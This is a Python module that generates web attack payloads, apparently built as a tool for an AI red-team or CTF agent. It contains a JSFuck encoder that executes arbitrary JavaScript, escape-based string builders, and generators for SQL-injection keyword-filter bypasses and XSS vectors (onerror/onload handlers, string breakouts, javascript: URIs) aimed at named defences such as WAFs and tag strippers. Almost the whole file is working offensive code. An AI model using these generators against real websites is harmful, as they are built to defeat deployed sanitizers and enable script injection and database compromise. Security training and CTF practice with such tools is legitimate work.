"""Web-exploitation filter-bypass payload generators.

Deterministic transforms for web attack surfaces, the mechanical counterpart to
the AI-red-team encoders in the sibling modules: when a weak model has *mapped*
a filter (alphanumerics blocked, a SQL keyword stripped, complete HTML tags
removed) but cannot reliably *emit* the bypass payload by hand, it calls one of
these and gets a correct, reproducible result instead of guessing.

Covers three families that recur across CTF/web targets:

  * JSFuck ``jsfuck`` — run arbitrary JS using only the six characters
    ``[]()!+`` (no alphanumerics). The answer to a context that blocks every
    letter and digit. V8/Chromium-family target (the common headless-browser
    XSS oracle); see ``_CHARMAP`` for the (node-validated) derivation.
  * JS string construction ``js_fromcharcode`` / ``js_unicode_escape`` /
    ``js_hex_escape`` — build a string/identifier without writing its literal
    characters, for partial filters (quotes stripped, specific keywords blocked).
  * ``sql_keyword_bypass`` / ``xss_filter_bypass`` — enumerate the standard
    obfuscations of one payload against a named defence (keyword allow-list,
    complete-tag stripping, attribute context, …). Multi-variant: the model
    tries them in order instead of re-deriving the trick.

Zero third-party deps, in-process, no AGPL tables — every expression is derived
from JS coercion semantics (the JSFuck *technique* is public; no lookup table is
copied). The JSFuck charmap is validated by executing every character in node in
the test-suite (tests/test_transform_web_bypass.py).
"""
from __future__ import annotations

import re

# ── JSFuck ──────────────────────────────────────────────────────────────────
# Encode arbitrary JS into the six-character alphabet []()!+ . Built node-free
# from JS coercion semantics; V8/Chromium-family native-code strings bootstrap
# the few characters with no spec-portable source (exactly as jsfuck.com does,
# e.g. (Number+'')[11] === 'm'). Everything else routes through the portable
# toString(radix) / unescape("%xx") machinery, so emitted payloads run on the
# Chromium-family engines that back essentially all headless-browser XSS oracles.

_SIX = frozenset("[]()!+")

# V8/Chromium-family native-code string values (node emits these too).
_NATIVE = {
    "([]+[])": "function String() { [native code] }",
    "(+[])":   "function Number() { [native code] }",
    "(![])":   "function Boolean() { [native code] }",
    "[]":      "function Array() { [native code] }",
}


def _num(n: int) -> str:
    """Small non-negative int as a JSFuck numeric expression (value == n)."""
    if n == 0:
        return "+[]"
    if n == 1:
        return "+!+[]"
    return "+!+[]" + "+!+[]" * (n - 1)


def _idx(expr: str, i: int) -> str:
    return f"({expr})[{_num(i)}]"


def _build_str(s: str, cmap: dict) -> str | None:
    """A JSFuck expression evaluating to the string ``s``, or None if some
    character is not yet minted."""
    if s == "":
        return "([]+[])"
    if any(ch not in cmap for ch in s):
        return None
    return "(" + "+".join(f"({cmap[ch]})" for ch in s) + ")"


def _add_value(cmap: dict, value: str, expr: str) -> None:
    for i, ch in enumerate(value):
        cmap.setdefault(ch, _idx(expr, i))


def _build_charmap() -> tuple[dict, str, str]:
    """Return (char->expr map, Function-ctor expr, unescape-fn expr)."""
    cmap: dict[str, str] = {}
    for val, expr in {
        "false": "(![]+[])", "true": "(!![]+[])",
        "undefined": "([][[]]+[])", "NaN": "(+[![]]+[])",
    }.items():
        _add_value(cmap, val, expr)
    for d in range(10):
        cmap[str(d)] = f"({_num(d)}+[])"
    # [][ "entries" ]() + []  ->  "[object Array Iterator]"   (mints c,o,b,j,…)
    _add_value(cmap, "[object Array Iterator]",
               f"([][{_build_str('entries', cmap)}]()+[])")
    cs = _build_str("constructor", cmap)
    # constructor native-code strings -> m,v,g,S,(,),{,},space,…
    for base, val in _NATIVE.items():
        _add_value(cmap, val, f"({base}[{cs}]+[])")
    # constructor .name strings (spec-portable) -> uppercase A,N,B,S,…
    ns = _build_str("name", cmap)
    for base, nm in (("[]", "Array"), ("(+[])", "Number"),
                     ("(![])", "Boolean"), ("([]+[])", "String")):
        _add_value(cmap, nm, f"({base}[{cs}][{ns}])")
    # toString(radix) -> all of a-z (spec-portable)
    ts = _build_str("toString", cmap)
    for v in range(10, 36):
        ch = "0123456789abcdefghijklmnopqrstuvwxyz"[v]
        cmap.setdefault(ch, f"({_num(v)})[{ts}]({_num(v + 1)})")
    func = f"([]+[])[{cs}][{cs}]"                       # String.constructor.constructor
    # escape(" ") == "%20"  ->  mint '%'
    esc = f"{func}({_build_str('return escape', cmap)})()"
    _add_value(cmap, "%20", f"({esc}({cmap[' ']}))")
    # unescape fn  ->  every remaining character via unescape("%xx")/("%uxxxx")
    un = f"{func}({_build_str('return unescape', cmap)})()"
    return cmap, func, un


# Built once at import (pure Python, no I/O).
_CHARMAP, _FUNC, _UNESCAPE = _build_charmap()


def _jsfuck_char(ch: str) -> str | None:
    if ch in _CHARMAP:
        return _CHARMAP[ch]
    code = ord(ch)
    pct = f"%{code:02x}" if code < 0x100 else f"%u{code:04x}"
    body = _build_str(pct, _CHARMAP)
    return f"{_UNESCAPE}({body})" if body else None


def jsfuck_string(text: str) -> str:
    """A JSFuck expression (chars ``[]()!+`` only) that *evaluates to* ``text``."""
    parts = []
    for ch in text:
        expr = _jsfuck_char(ch)
        if expr is None:  # pragma: no cover - charmap covers all of Unicode via %u
            raise ValueError(f"jsfuck: cannot encode character {ch!r}")
        parts.append(f"({expr})")
    return "(" + "+".join(parts) + ")" if parts else "([]+[])"


def jsfuck(code: str) -> str:
    """A JSFuck payload (chars ``[]()!+`` only) that *executes* ``code`` as JS.

    Wraps the encoded source in ``Function(src)()``. Use as the whole value of a
    sink that blocks alphanumerics, e.g. ``<img src=x onerror=JSFUCK>``.
    """
    return f"{_FUNC}({jsfuck_string(code)})()"


# ── JS string construction (for partial filters) ────────────────────────────

def _fromcharcode_encode(text: str) -> str:
    return "String.fromCharCode(" + ",".join(str(ord(c)) for c in text) + ")"


def _fromcharcode_decode(text: str) -> str:
    m = re.search(r"fromCharCode\s*\(([^)]*)\)", text)
    body = m.group(1) if m else text
    nums = re.findall(r"-?\d+", body)
    return "".join(chr(int(n) & 0x10FFFF) for n in nums)


def _unicode_escape_encode(text: str) -> str:
    out = []
    for c in text:
        o = ord(c)
        out.append(f"\\u{{{o:x}}}" if o > 0xFFFF else f"\\u{o:04x}")
    return "".join(out)


def _unicode_escape_decode(text: str) -> str:
    def _sub(m):
        return chr(int(m.group(1) or m.group(2), 16))
    return re.sub(r"\\u\{([0-9a-fA-F]+)\}|\\u([0-9a-fA-F]{4})", _sub, text)


def _hex_escape_encode(text: str) -> str:
    out = []
    for c in text:
        o = ord(c)
        out.append(f"\\x{o:02x}" if o < 0x100 else (f"\\u{{{o:x}}}" if o > 0xFFFF else f"\\u{o:04x}"))
    return "".join(out)


def _hex_escape_decode(text: str) -> str:
    def _sub(m):
        return chr(int(m.group(1) or m.group(2) or m.group(3), 16))
    return re.sub(r"\\x([0-9a-fA-F]{2})|\\u\{([0-9a-fA-F]+)\}|\\u([0-9a-fA-F]{4})", _sub, text)


# ── Registry contract ────────────────────────────────────────────────────────
# {name: {"encode", "decode", "category", "reversible"}}

TRANSFORMS: dict[str, dict] = {
    "jsfuck": {
        "encode": jsfuck, "decode": None,          # one-way: a JS engine runs it
        "category": "web", "reversible": False,
    },
    "jsfuck_string": {
        "encode": jsfuck_string, "decode": None,
        "category": "web", "reversible": False,
    },
    "js_fromcharcode": {
        "encode": _fromcharcode_encode, "decode": _fromcharcode_decode,
        "category": "web", "reversible": True,
    },
    "js_unicode_escape": {
        "encode": _unicode_escape_encode, "decode": _unicode_escape_decode,
        "category": "web", "reversible": True,
    },
    "js_hex_escape": {
        "encode": _hex_escape_encode, "decode": _hex_escape_decode,
        "category": "web", "reversible": True,
    },
}


# ── Multi-variant generators (defeat a *named* defence) ──────────────────────

def sql_keyword_bypass(payload: str, keywords: list[str] | None = None) -> list[dict]:
    """Enumerate obfuscations of a SQL ``payload`` against keyword allow-/deny-lists.

    Each variant names the filter class it defeats, so the model picks by the
    defence it has already mapped rather than re-deriving the trick. Deterministic
    and ordered cheapest-first.
    """
    kws = keywords or _detect_sql_keywords(payload)
    variants: list[dict] = []

    def add(technique: str, defeats: str, out: str):
        if out and out != payload and all(v["payload"] != out for v in variants):
            variants.append({"technique": technique, "defeats": defeats, "payload": out})

    # 1) case toggle — defeats case-sensitive exact-string denylists
    add("case_toggle", "case-sensitive keyword match",
        "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(payload)))
    # 2) inline comments inside keywords — defeats word-boundary/exact match
    ic = payload
    for kw in kws:
        ic = re.sub(re.escape(kw), lambda m: _split_with(m.group(0), "/**/"), ic, flags=re.I)
    add("inline_comment_split", "exact keyword / \\bword\\b match", ic)
    # 3) double-keyword — defeats a filter that STRIPS the keyword once
    dk = payload
    for kw in kws:
        dk = re.sub(re.escape(kw), lambda m: _double_keyword(m.group(0)), dk, flags=re.I)
    add("double_keyword", "single-pass strip (filter removes the keyword once)", dk)
    # 4) whitespace alternatives — defeats space-based tokenisation
    for ws, label in (("/**/", "comment"), ("%0a", "newline"), ("%09", "tab"), ("%0c", "formfeed")):
        add(f"whitespace_{label}", "space-delimited token filter", re.sub(r"\s+", ws, payload))
    # 5) MySQL version comment — executes inside /*!...*/, bypasses naive strippers
    vc = payload
    for kw in kws:
        vc = re.sub(re.escape(kw), lambda m: f"/*!50000{m.group(0)}*/", vc, flags=re.I)
    add("mysql_version_comment", "comment-stripping WAF (MySQL)", vc)
    # 6) URL-encode keyword characters — defeats literal substring match pre-decode
    ue = payload
    for kw in kws:
        ue = re.sub(re.escape(kw), lambda m: "".join(f"%{ord(c):02x}" for c in m.group(0)), ue, flags=re.I)
    add("url_encode_keyword", "pre-URL-decode substring match", ue)
    return variants


def _detect_sql_keywords(payload: str) -> list[str]:
    common = ["UNION", "SELECT", "FROM", "WHERE", "OR", "AND", "ORDER BY",
              "GROUP BY", "INSERT", "UPDATE", "DELETE", "SLEEP", "BENCHMARK"]
    found = [k for k in common if re.search(r"\b" + re.escape(k) + r"\b", payload, re.I)]
    return found or ["UNION", "SELECT"]


def _split_with(word: str, sep: str) -> str:
    if len(word) < 2:
        return word
    mid = len(word) // 2
    return word[:mid] + sep + word[mid:]


def _double_keyword(word: str) -> str:
    # insert the word into the middle of itself: removing one copy leaves the word
    mid = len(word) // 2
    return word[:mid] + word + word[mid:]


def xss_filter_bypass(js: str = "alert(1)", context: str = "html") -> list[dict]:
    """Enumerate XSS vectors that survive a *named* filter class.

    context: html | attribute | js_string | href | alphanumeric_blocked
    Each variant says which filter it defeats. Deterministic, ordered.
    """
    variants: list[dict] = []

    def add(technique: str, defeats: str, payload: str):
        if all(v["payload"] != payload for v in variants):
            variants.append({"technique": technique, "defeats": defeats, "payload": payload})

    if context == "alphanumeric_blocked":
        add("jsfuck", "all alphanumerics blocked (symbols only)",
            f"<img src=x onerror={jsfuck(js)}>")
        add("jsfuck_bare", "all alphanumerics blocked — raw executing expression", jsfuck(js))
        return variants

    if context in ("html", "attribute"):
        prefix = '"><' if context == "attribute" else '<'
        # unclosed tag — defeats a regex that strips only COMPLETE <...> tags
        add("unclosed_tag", "complete-tag stripper <[^>]+> (no closing '>')",
            f"{prefix}svg onload={js}//")
        add("unclosed_img", "complete-tag stripper (unclosed <img>)",
            f"{prefix}img src=x onerror={js}")
        # slash-separated — defeats space-removal / attribute parsers
        add("slash_separators", "whitespace-stripping filter",
            f"{prefix}svg/onload={js}>")
        # mixed case — defeats case-sensitive tag/handler denylist
        add("mixed_case_tag", "case-sensitive tag/handler denylist",
            f"{prefix}sVg OnLoad={js}>")
        # nested/broken tag — defeats one-pass tag removal
        add("nested_broken_tag", "single-pass tag removal",
            f"{prefix}<svg onload={js}>")
        # no-parens handler — defeats '(' ')' filtering
        add("no_parens", "parenthesis filter",
            f"{prefix}svg onload={js.split('(')[0]}`1`>" if "(" in js else f"{prefix}svg onload={js}>")

    if context == "js_string":
        add("string_break", "reflected inside a single-quoted JS string",
            f"';{js};//")
        add("string_break_dq", "reflected inside a double-quoted JS string",
            f'";{js};//')
        add("template_break", "reflected inside a template literal",
            f"${{{js}}}")

    if context == "href":
        add("javascript_uri", "href/src sink", f"javascript:{js}")
        add("javascript_uri_entity", "href filter — HTML-entity-encoded scheme",
            "javascript&colon;" + js)
    return variants
